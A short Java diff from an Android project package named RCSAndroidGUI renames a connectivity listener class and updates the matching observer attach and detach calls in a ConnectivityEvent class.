@@ -6,7 +6,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Connectivity;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.listener.ConnectivityListener;
+import com.ht.RCSAndroidGUI.listener.ListenerConnectivity;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class ConnectivityEvent extends EventBase implements Observer<Connectivity> {
@@ -18,12 +18,12 @@ public class ConnectivityEvent extends EventBase implements Observer<Connectivit
 		
 		@Override
 		public void begin() {
-			ConnectivityListener.self().attach(this);
+			ListenerConnectivity.self().attach(this);
 		}
 
 		@Override
 		public void end() {
-			ConnectivityListener.self().detach(this);
+			ListenerConnectivity.self().detach(this);
 		}
 
 		@Override
